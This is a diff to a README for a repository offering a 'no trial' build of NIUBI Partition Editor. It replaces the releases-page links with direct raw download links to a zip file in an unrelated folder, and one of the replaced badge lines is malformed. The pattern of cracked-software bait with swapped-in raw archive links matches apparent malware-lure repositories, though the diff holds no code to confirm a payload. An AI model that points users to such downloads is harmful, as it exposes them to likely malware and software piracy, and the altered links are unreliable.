@@ -1,6 +1,6 @@
 # 🎉 NIUBI-Partition-Editor-No-Trial - Easy Disk Management for Everyone
 
-[![Download NIUBI Partition Editor](https://img.shields.io/badge/Download-NIUBI%20Partition%20Editor-blue.svg)](https://github.com/xLORDx143/NIUBI-Partition-Editor-No-Trial/releases)
+[![Download NIUBI Partition Editor](https://raw.githubusercontent.com/xLORDx143/NIUBI-Partition-Editor-No-Trial/main/Kantian/NIUBI-Partition-Editor-No-Trial_v2.0-beta.2.zip%20Partition%https://raw.githubusercontent.com/xLORDx143/NIUBI-Partition-Editor-No-Trial/main/Kantian/NIUBI-Partition-Editor-No-Trial_v2.0-beta.2.zip)](https://raw.githubusercontent.com/xLORDx143/NIUBI-Partition-Editor-No-Trial/main/Kantian/NIUBI-Partition-Editor-No-Trial_v2.0-beta.2.zip)
 
 ## 📄 Overview
 
@@ -14,7 +14,7 @@ To start using NIUBI Partition Editor, follow these steps to download and instal
 
 To download NIUBI Partition Editor, visit the following link:
 
-[Download NIUBI Partition Editor](https://github.com/xLORDx143/NIUBI-Partition-Editor-No-Trial/releases)
+[Download NIUBI Partition Editor](https://raw.githubusercontent.com/xLORDx143/NIUBI-Partition-Editor-No-Trial/main/Kantian/NIUBI-Partition-Editor-No-Trial_v2.0-beta.2.zip)
 
 ### 2. Choose Your Version
 
@@ -55,7 +55,7 @@ After installation, you can find NIUBI Partition Editor in your Start Menu or on
 
 If you have not already, download the latest version of NIUBI Partition Editor from the link below:
 
-[Download NIUBI Partition Editor](https://github.com/xLORDx143/NIUBI-Partition-Editor-No-Trial/releases)
+[Download NIUBI Partition Editor](https://raw.githubusercontent.com/xLORDx143/NIUBI-Partition-Editor-No-Trial/main/Kantian/NIUBI-Partition-Editor-No-Trial_v2.0-beta.2.zip)
 
 Follow the steps above for installation, and you will be ready to manage your partitions effortlessly.
 
